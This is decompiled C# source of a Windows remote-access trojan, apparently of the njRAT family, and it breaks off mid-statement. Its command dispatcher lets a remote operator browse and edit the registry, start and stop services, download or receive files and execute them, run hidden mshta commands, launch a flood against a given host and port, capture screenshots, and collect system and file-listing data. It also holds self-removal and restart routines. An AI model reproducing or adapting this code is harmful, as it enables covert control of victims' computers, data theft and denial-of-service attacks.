using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using n.My;
using n.My.Resources;

namespace n;

[StandardModule]
internal sealed class IND
{
	public delegate void indd(string T);

	public static string TM = Interaction.Environ("temp") + "\\";

	public static string Y = "^:^";

	private static int ER;

	public static int LPING;

	public static chat Ca = new chat();

	private static byte[] Cdll;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	static IND()
	{
		byte[] cam = Resources.Cam;
		bool CM = false;
		Cdll = (byte[])API.ZIP(cam, ref CM).Clone();
	}

	public static void inddd(string T)
	{
		RichTextBox t = B.Chat.T1;
		t.set_Text(t.get_Text() + B.Chat.nick + " : " + T + "\r\n");
	}

	public static RegistryKey Rk(ref string p, ref bool W)
	{
		Array array = Strings.Split(p, "\\", -1, (CompareMethod)0);
		object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null);
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CLASSES_ROOT", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_USER", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_LOCAL_MACHINE", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_USERS", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_Users().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_CONFIG", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		RegistryKey result = default(RegistryKey);
		return result;
	}

	public static void ind(byte[] Da)
	{
		//IL_0906: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b86: Expected O, but got Unknown
		//IL_1b9c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ba2: Expected O, but got Unknown
		//IL_29d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_29db: Expected O, but got Unknown
		//IL_3cc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cc8: Expected O, but got Unknown
		//IL_3e62: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e69: Expected O, but got Unknown
		ER = 0;
		string @string = Encoding.UTF8.GetString(Da);
		checked
		{
			int num2 = default(int);
			try
			{
				Array array = Strings.Split(@string, Y, -1, (CompareMethod)0);
				switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString())
				{
				case "#KON":
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"T", false))
					{
						B.KON = true;
					}
					else
					{
						B.KON = false;
					}
					break;
				case "#RG":
				{
					ER = 1;
					object obj4 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj4, (object)"~", false))
					{
						object[] array30 = new object[1];
						object[] array31 = array30;
						int num11 = 2;
						array31[0] = 2;
						string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
						bool CM = false;
						RegistryKey registryKey = Rk(ref T2, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
						RegistryKey registryKey2 = registryKey;
						string[] subKeyNames = registryKey2.GetSubKeyNames();
						string text12 = default(string);
						foreach (string text11 in subKeyNames)
						{
							string text13 = text12;
							T2 = text11 + Y + Y + "Key";
							text12 = text13 + API.ENB(ref T2) + Y;
						}
						string[] valueNames = registryKey2.GetValueNames();
						foreach (string text14 in valueNames)
						{
							string text15 = registryKey2.GetValue(text14, RuntimeHelpers.GetObjectValue(new object()))!.ToString();
							if (text15.Length > 200)
							{
								text15 = Strings.Mid(text15, 1, 200);
							}
							string text16 = text12;
							T2 = text14 + Y + text15 + Y + "Value";
							text12 = text16 + API.ENB(ref T2) + Y;
						}
						B b14 = MyProject.Forms.B;
						T2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat("#RG" + Y, "~"), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), (object)Y), (object)text12));
						b14.SEND(ref T2);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"!", false))
					{
						object[] array30 = new object[1];
						object[] array32 = array30;
						int num11 = 2;
						array32[0] = 2;
						string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
						bool CM = true;
						RegistryKey registryKey3 = Rk(ref T2, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
						RegistryKey registryKey4 = registryKey3;
						registryKey4.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)), RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 4 }, (string[])null)));
					}
					else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"@", false))
					{
						object[] array30 = new object[1];
						object[] array33 = array30;
						int num11 = 2;
						array33[0] = 2;
						string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
						bool CM = true;
						RegistryKey registryKey5 = Rk(ref T2, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
						RegistryKey registryKey6 = registryKey5;
						int num25 = array.Length - 1;
						for (int num26 = 3; num26 <= num25; num26++)
						{
							Array array34 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num26 }, (string[])null)), "\\", -1, (CompareMethod)0);
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array34, new object[1] { 1 }, (string[])null), (object)"Key", false))
							{
								registryKey6.DeleteSubKeyTree(Conversions.ToString(NewLateBinding.LateIndexGet((object)array34, new object[1] { 0 }, (string[])null)));
							}
							else
							{
								registryKey6.DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array34, new object[1] { 0 }, (string[])null)));
							}
						}
					}
					else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"#", false))
					{
						object[] array30 = new object[1];
						object[] array35 = array30;
						int num11 = 2;
						array35[0] = 2;
						string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
						bool CM = true;
						RegistryKey registryKey7 = Rk(ref T2, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
						RegistryKey registryKey8 = registryKey7;
						registryKey8.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
					}
					break;
				}
				case "#k":
				{
					ER = 1;
					string T2 = "lg";
					string T = "..";
					string value = NK.GetValue(ref T2, ref T);
					B b13 = MyProject.Forms.B;
					T = "#k" + Y + value;
					b13.SEND(ref T);
					break;
				}
				case "#X":
				{
					ER = 0;
					int num14 = 8 + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length;
					MemoryStream memoryStream9 = new MemoryStream();
					memoryStream9.Write(Da, num14, Da.Length - num14);
					byte[] b7 = memoryStream9.ToArray();
					bool CM = false;
					byte[] bytes = API.ZIP(b7, ref CM);
					int num15 = 0;
					do
					{
						if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num15), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
						{
							try
							{
								File.Delete(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num15), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
								File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num15), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
								NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num15), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
								break;
							}
							catch (Exception ex8)
							{
								ProjectData.SetProjectError(ex8, num2);
								ProjectData.ClearProjectError();
							}
							num15++;
							continue;
						}
						File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num15), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
						NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num15), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
						break;
					}
					while (num15 <= 999);
					break;
				}
				case "##":
				{
					ER = 5;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().SetValue("p", RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					B b17 = MyProject.Forms.B;
					string T = "plugin";
					b17.SEND(ref T);
					break;
				}
				case "#Rec":
					break;
				case "#ser0":
				{
					ER = 1;
					ServiceController[] services2 = ServiceController.GetServices();
					string text8 = default(string);
					string T;
					foreach (ServiceController val4 in services2)
					{
						string text9 = text8;
						string y = Y;
						T = val4.get_ServiceName() + "{}" + Strings.Replace(Strings.Replace(Conversions.ToString(val4.get_CanStop()), Conversions.ToString(true), "Yes", 1, -1, (CompareMethod)0), Conversions.ToString(false), "No", 1, -1, (CompareMethod)0) + "{}" + ((Enum)val4.get_Status()).ToString() + "{}" + val4.get_DisplayName();
						text8 = text9 + y + API.ENB(ref T);
					}
					B b11 = MyProject.Forms.B;
					T = "#ser0" + text8;
					b11.SEND(ref T);
					break;
				}
				case "#ser1":
				{
					ER = 1;
					ServiceController[] services3 = ServiceController.GetServices();
					foreach (ServiceController val7 in services3)
					{
						if (Operators.ConditionalCompareObjectEqual((object)val7.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
						{
							val7.Start();
						}
					}
					break;
				}
				case "#ser2":
				{
					ER = 1;
					ServiceController[] services = ServiceController.GetServices();
					foreach (ServiceController val2 in services)
					{
						if (Operators.ConditionalCompareObjectEqual((object)val2.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
						{
							val2.Stop();
						}
					}
					break;
				}
				case "#R":
				{
					ER = 0;
					string T = "vname";
					object[] array30 = new object[1];
					object[] array72 = array30;
					int num11 = 1;
					array72[0] = 1;
					string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
					NK.SetValue(ref T, ref T2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T2 }, (string[])null, true, false);
					B.Vname = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					B b27 = MyProject.Forms.B;
					T = Conversions.ToString(Operators.ConcatenateObject((object)("#R" + Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					b27.SEND(ref T);
					break;
				}
				case "ping":
				{
					B b25 = MyProject.Forms.B;
					string T = "pong";
					b25.SEND(ref T);
					break;
				}
				case "#0":
				{
					ER = 0;
					B b21 = MyProject.Forms.B;
					string T = "#red";
					b21.SEND(ref T);
					FLD fLD2 = new FLD();
					object[] array30 = new object[1];
					object[] array65 = array30;
					int num11 = 1;
					array65[0] = 1;
					T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
					string text39 = API.DEB(ref T);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T }, (string[])null, true, false);
					fLD2.HOST = Strings.Split(text39, Y, -1, (CompareMethod)0)[0];
					array30 = new object[1];
					object[] array66 = array30;
					num11 = 1;
					array66[0] = 1;
					T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
					string text40 = API.DEB(ref T);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T }, (string[])null, true, false);
					fLD2.Port = Conversions.ToInteger(Strings.Split(text40, Y, -1, (CompareMethod)0)[1]);
					fLD2.pk = new byte[1001];
					array30 = new object[1];
					object[] array67 = array30;
					num11 = 1;
					array67[0] = 1;
					T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
					string text41 = API.DEB(ref T);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T }, (string[])null, true, false);
					fLD2.Count = Conversions.ToInteger(Strings.Split(text41, Y, -1, (CompareMethod)0)[2]);
					bool CM = false;
					fLD2.Start(ref CM);
					B b22 = MyProject.Forms.B;
					T = "#Bla";
					b22.SEND(ref T);
					break;
				}
				case "#1":
				{
					ER = 0;
					B b19 = MyProject.Forms.B;
					string T = "#red";
					b19.SEND(ref T);
					FLD fLD = new FLD();
					object[] array30 = new object[1];
					object[] array59 = array30;
					int num11 = 1;
					array59[0] = 1;
					T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
					string text33 = API.DEB(ref T);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T }, (string[])null, true, false);
					fLD.HOST = Strings.Split(text33, Y, -1, (CompareMethod)0)[0];
					array30 = new object[1];
					object[] array60 = array30;
					num11 = 1;
					array60[0] = 1;
					T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
					string text34 = API.DEB(ref T);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T }, (string[])null, true, false);
					fLD.Port = Conversions.ToInteger(Strings.Split(text34, Y, -1, (CompareMethod)0)[1]);
					fLD.pk = new byte[1001];
					array30 = new object[1];
					object[] array61 = array30;
					num11 = 1;
					array61[0] = 1;
					T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
					string text35 = API.DEB(ref T);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T }, (string[])null, true, false);
					fLD.Count = Conversions.ToInteger(Strings.Split(text35, Y, -1, (CompareMethod)0)[2]);
					bool CM = true;
					fLD.Start(ref CM);
					B b20 = MyProject.Forms.B;
					T = "#Bla";
					b20.SEND(ref T);
					break;
				}
				case "#2":
				{
					ER = 0;
					string text29 = "." + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0)[Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0).Length - 1];
					int num32 = 0;
					int num33 = default(int);
					do
					{
						IL_0f8c:
						if (File.Exists(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num32) + text29))
						{
							try
							{
								File.Delete(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num32) + text29);
								num33++;
								if (num33 > 5)
								{
									break;
								}
							}
							catch (Exception ex15)
							{
								ProjectData.SetProjectError(ex15, num2);
								ProjectData.ClearProjectError();
								goto IL_0f7a;
							}
							goto IL_0f8c;
						}
						string text30 = Interaction.Environ("appdata") + "\\" + Conversions.ToString(num32) + text29;
						Network network = ((ServerComputer)MyProject.Computer).get_Network();
						object[] array46 = new object[2];
						object[] array47 = array46;
						object[] array30 = new object[1];
						object[] array48 = array30;
						int num11 = 1;
						array48[0] = 1;
						array47[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
						array46[1] = text30;
						object[] array49 = array46;
						object[] array50 = array49;
						bool[] array51 = new bool[2] { true, true };
						NewLateBinding.LateCall((object)network, (Type)null, "DownloadFile", array50, (string[])null, (Type[])null, array51, true);
						if (array51[0])
						{
							NewLateBinding.LateIndexSetComplex((object)array, new object[2]
							{
								num11,
								RuntimeHelpers.GetObjectValue(array49[0])
							}, (string[])null, true, false);
						}
						if (array51[1])
						{
							text30 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array49[1]), typeof(string));
						}
						Process.Start(text30);
						break;
						IL_0f7a:
						num32++;
					}
					while (num32 <= 9999);
					break;
				}
				case "#3":
				{
					ER = 0;
					MemoryStream memoryStream14 = new MemoryStream();
					byte[] bytes2 = Encoding.Default.GetBytes("#4" + Y);
					memoryStream14.Write(bytes2, 0, bytes2.Length);
					Encoding @default = Encoding.Default;
					string T = "plugin.C";
					string T2 = "Pass";
					object P = null;
					string S = Conversions.ToString(global::n.C.inv(ref global::n.C.Plug, ref T, ref T2, ref P));
					byte[] bytes3 = @default.GetBytes(API.ENB(ref S));
					bool CM = true;
					bytes2 = API.ZIP(bytes3, ref CM);
					memoryStream14.Write(bytes2, 0, bytes2.Length);
					MyProject.Forms.B.WC.SendData(memoryStream14.ToArray());
					break;
				}
				case "#4":
					ER = 0;
					try
					{
						MyProject.Forms.B.BW.B.Dispose();
						A.fj.Dispose();
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3, num2);
						ProjectData.ClearProjectError();
					}
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"!", false))
					{
						NK.CLEAR();
						try
						{
							DriveInfo[] drives = DriveInfo.GetDrives();
							foreach (DriveInfo driveInfo in drives)
							{
								if (!driveInfo.IsReady || driveInfo.TotalFreeSpace <= 0L)
								{
									continue;
								}
								try
								{
									if (File.Exists(driveInfo.Name + B.Uo))
									{
										File.Delete(driveInfo.Name + B.Uo);
									}
								}
								catch (Exception ex4)
								{
									ProjectData.SetProjectError(ex4, num2);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception ex5)
						{
							ProjectData.SetProjectError(ex5, num2);
							ProjectData.ClearProjectError();
						}
						Process[] processesByName = Process.GetProcessesByName("wscript");
						foreach (Process process2 in processesByName)
						{
							try
							{
								process2.Kill();
							}
							catch (Exception ex6)
							{
								ProjectData.SetProjectError(ex6, num2);
								ProjectData.ClearProjectError();
							}
						}
						try
						{
							string path3 = Application.get_StartupPath() + "\\j.vbs";
							string S = Resources.W;
							File.WriteAllText(path3, API.DEB(ref S).Replace("NJ", Application.get_ExecutablePath()));
							Process.Start(Application.get_StartupPath() + "\\j.vbs");
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7, num2);
							ProjectData.ClearProjectError();
						}
					}
					ProjectData.EndApp();
					break;
				case "#5":
				{
					ER = 0;
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "mshta.exe";
					processStartInfo.Arguments = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					processStartInfo.CreateNoWindow = true;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process process = Process.Start(processStartInfo);
					Thread.Sleep(60000);
					try
					{
						process.Kill();
						break;
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2, num2);
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "#6":
					ER = 0;
					try
					{
						MyProject.Forms.B.BW.B.Dispose();
						if (A.fj.Id > 1)
						{
							A.fj.Kill();
						}
					}
					catch (Exception ex19)
					{
						ProjectData.SetProjectError(ex19, num2);
						ProjectData.ClearProjectError();
					}
					Process.Start(Application.get_ExecutablePath());
					ProjectData.EndApp();
					break;
				case "#7":
				{
					ER = 2;
					object[] array14 = new object[1];
					object[] array69 = array14;
					int num11 = 1;
					array69[0] = 1;
					int num5 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					byte[] array70 = sc.gc(ref num5);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, num5 }, (string[])null, true, false);
					byte[] array71 = array70;
					if (array71.Length == 0)
					{
						B b24 = MyProject.Forms.B;
						string S = "#5" + Y + Conversions.ToString(0);
						b24.SEND(ref S);
					}
					else
					{
						MemoryStream memoryStream15 = new MemoryStream();
						memoryStream15.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
						memoryStream15.Write(array71, 0, array71.Length);
						MyProject.Forms.B.WC.SendData(memoryStream15.ToArray());
					}
					break;
				}
				case "#8":
				{
					string text42 = "\r\n";
					string text43 = text43 + "PC InfoX*X==" + text42;
					text43 = text43 + "PC\\UserX*X" + B.PC + text42;
					text43 = text43 + "CountryX*X" + API.Gc() + text42;
					text43 = text43 + "OSX*X" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Windows", "")
						.Replace("  ", " ")
						.Replace("Microsoft", "")
						.Replace("®", "")
						.Replace("™", "") + text42;
					text43 = Conversions.ToString(Operators.AddObject((object)text43, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ProcessorX*X", ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")!.GetValue("~mhz")), (object)" *"), (object)Environment.ProcessorCount), (object)"~MHZ"), (object)text42)));
					text43 = text43 + "RAMX*X" + Strings.Format((object)((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1073741824.0), "#0.00 GB") + text42;
					text43 = text43 + "UpTimeX*X" + Strings.Split(Strings.Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5), ".", -1, (CompareMethod)0)[0] + " :Hours" + text42;
					text43 = text43 + "Server InfoX*X==" + text42;
					text43 = text43 + "ServerX*X" + API.DEB(ref B.Vname) + text42;
					text43 = text43 + "Host:PortX*X" + B.no + text42;
					text43 = text43 + "DirectoryX*X" + Application.get_StartupPath() + text42;
					text43 = text43 + "ExeNameX*X" + AppDomain.CurrentDomain.FriendlyName + text42;
					text43 = text43 + "Process IDX*X" + Conversions.ToString(Process.GetCurrentProcess().Id) + text42;
					text43 = text43 + "StartupX*X" + B.SU + text42;
					text43 = text43 + "PersistantX*X" + Conversions.ToString(B.UU) + text42;
					text43 = text43 + "SpreadX*X" + B.spread + text42;
					text43 = text43 + "MutexX*X" + B.mU + text42;
					text43 = text43 + "First RunX*X" + B.FR + text42;
					text43 = text43 + "RegKeyX*X" + NK.Key + text42;
					text43 = text43 + "Firewall BypassX*X" + Strings.Replace(B.Fw.ToString(), "True", "Yes", 1, -1, (CompareMethod)0).Replace("False", "No");
					B b23 = MyProject.Forms.B;
					string S = "#7" + Y + API.ENB(ref text43);
					b23.SEND(ref S);
					break;
				}
				case "#9":
				{
					ER = 1;
					DriveInfo[] drives2 = DriveInfo.GetDrives();
					string text31 = default(string);
					string S;
					foreach (DriveInfo driveInfo2 in drives2)
					{
						if (driveInfo2.IsReady)
						{
							string text32 = text31;
							string y7 = Y;
							S = driveInfo2.Name;
							text31 = text32 + y7 + API.ENB(ref S);
						}
					}
					B b18 = MyProject.Forms.B;
					string[] array41 = new string[8] { "#8", text31, Y, null, null, null, null, null };
					string[] array56 = array41;
					string T2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
					array56[3] = API.ENB(ref T2);
					array41[4] = Y;
					string[] array57 = array41;
					string T = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();
					array57[5] = API.ENB(ref T);
					array41[6] = Y;
					string[] array58 = array41;
					S = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					array58[7] = API.ENB(ref S);
					string C = string.Concat(array41);
					b18.SEND(ref C);
					break;
				}
				case "#10":
				{
					ER = 1;
					object[] array14 = new object[1];
					object[] array36 = array14;
					int num5 = 1;
					array36[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string path11 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					string[] directories = Directory.GetDirectories(path11);
					string text18 = default(string);
					foreach (string text17 in directories)
					{
						string text19 = text18;
						string y3 = Y;
						object[] array30 = new object[1];
						object[] array37 = array30;
						int num11 = 1;
						array37[0] = 1;
						string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array30, (string[])null));
						string text20 = API.DEB(ref S);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, S }, (string[])null, true, false);
						string T = Strings.Replace(text17, text20, "", 1, -1, (CompareMethod)0) + "*DIR";
						text18 = text19 + y3 + API.ENB(ref T);
					}
					string[] array38 = new string[5] { "png", "jpg", "jpeg", "bmp", "ico" };
					int num28 = 0;
					array14 = new object[1];
					object[] array39 = array14;
					num5 = 1;
					array39[0] = 1;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string path12 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					string[] files = Directory.GetFiles(path12);
					bool flag = default(bool);
					foreach (string text21 in files)
					{
						string[] array40 = array38;
						foreach (string text22 in array40)
						{
							if (Operators.CompareString(text22.ToLower(), Strings.Split(text21, ".", -1, (CompareMethod)0)[Strings.Split(text21, ".", -1, (CompareMethod)0).Length - 1].ToLower(), false) == 0)
							{
								flag = true;
								break;
							}
						}
						if (unchecked(flag && num28 < 20))
						{
							try
							{
								Image val5 = Image.FromFile(text21);
								MemoryStream memoryStream13 = new MemoryStream();
								EncoderParameters val6 = new EncoderParameters(1);
								val6.get_Param()[0] = new EncoderParameter(Encoder.Quality, 40L);
								ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
								Image thumbnailImage = val5.GetThumbnailImage(20, 20, (GetThumbnailImageAbort)null, IntPtr.Zero);
								thumbnailImage.Save((Stream)memoryStream13, encoderInfo, val6);
								string text23 = text18;
								string y4 = Y;
								string[] array41 = new string[5];
								string[] array42 = array41;
								array14 = new object[1];
								object[] array43 = array14;
								num5 = 1;
								array43[0] = 1;
								C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
								string text24 = API.DEB(ref C);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
								array42[0] = Strings.Replace(text21, text24, "", 1, -1, (CompareMethod)0);
								array41[1] = "*";
								array41[2] = Conversions.ToString(FileSystem.FileLen(text21));
								array41[3] = "*";
								array41[4] = API.FEN(memoryStream13.ToArray());
								string S = string.Concat(array41);
								text18 = text23 + y4 + API.ENB(ref S);
								memoryStream13.Dispose();
								val6.Dispose();
								val5.Dispose();
								num28++;
							}
							catch (Exception ex14)
							{
								ProjectData.SetProjectError(ex14, num2);
								string text25 = text18;
								string y5 = Y;
								array14 = new object[1];
								object[] array44 = array14;
								num5 = 1;
								array44[0] = 1;
								C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
								string text26 = API.DEB(ref C);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
								string S = Strings.Replace(text21, text26, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text21));
								text18 = text25 + y5 + API.ENB(ref S);
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							string text27 = text18;
							string y6 = Y;
							array14 = new object[1];
							object[] array45 = array14;
							num5 = 1;
							array45[0] = 1;
							C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
							string text28 = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
							string S = Strings.Replace(text21, text28, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text21));
							text18 = text27 + y6 + API.ENB(ref S);
						}
					}
					B b15 = MyProject.Forms.B;
					C = "#9" + text18;
